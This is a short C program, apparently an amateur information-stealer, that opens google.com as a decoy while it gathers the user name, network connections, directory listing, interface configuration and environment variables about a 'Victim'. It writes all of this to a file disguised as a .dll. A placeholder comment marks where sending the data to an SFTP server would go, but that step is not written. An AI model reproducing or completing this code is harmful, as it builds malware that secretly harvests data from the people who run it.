#include <stdio.h> 
#include <stdlib.h> 
#include <pthread.h>

int main() {

    /* open external website */ 
    system("open https://www.google.com");
    
    /* open file to store computer information*/
    char sentence[1500]; FILE *fptr;
    fptr = fopen("crapXXXXXX.dll", "w"); 
    if(fptr == NULL) {
        printf("Error!"); 
        exit(1);
    } 

    /* get information about user */
    FILE *whoami;
    char output[256];
    whoami = popen("whoami", "r");
    
    while (fgets(output, 256, whoami) != NULL)
    {
        fprintf(fptr,"Victim: %s\n", output); 
        
    }
    pclose(whoami);

    /* record network traffic and connections
       using -n to skip IP translation for speedy result */
    FILE *netstat;
    netstat = popen("netstat -n", "r");
    
    while (fgets(output, 256, netstat) != NULL)
    {
        fprintf(fptr,"%s\n", output); 
        
    }
    pclose(netstat);

    /* store environment information */
    fprintf(fptr,"PATH: %s\n", getenv("PATH"));
    fprintf(fptr,"HOME: %s\n", getenv("HOME"));
    fprintf(fptr,"ROOT: %s\n", getenv("USER"));

    /* store directory information */ 
    FILE *ls = popen("ls -al", "r");
    while (fgets(output, sizeof(output), ls) != 0) {
        /* extract each line from output of command*/ 
    } 
     /* write output to the file*/ 
    fprintf(fptr,"** %s.", output); 

    /* store networking information */
    FILE *ifconfig;
    // output[256];
    ifconfig = popen("ifconfig", "r");

    while (fgets(output, 256, ifconfig) != NULL){
        /* write output to the file*/ 
        fprintf(fptr,"%s.", output); 
    }

    pclose(ifconfig);

    /* close file */
    fclose(fptr);

    /* send information to sftp server */


    /* open external website */ 
    system("open https://www.google.com");
} 
